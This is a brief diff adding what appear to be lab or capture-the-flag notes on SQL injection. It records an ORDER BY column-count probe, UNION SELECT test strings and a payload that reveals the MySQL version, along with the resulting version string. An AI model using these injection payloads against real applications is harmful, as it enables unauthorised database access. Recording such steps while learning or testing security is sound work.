@@ -1,0 +1,11 @@
+
+' order by 3# -> internal server error
+
+3 - 1 = 2
+
+' UNION SELECT 'a', 'a'%23
+
+' UNION SELECT @@version, NULL#
+SELECT @@version 
+
+8.0.34-0ubuntu0.20.04.1
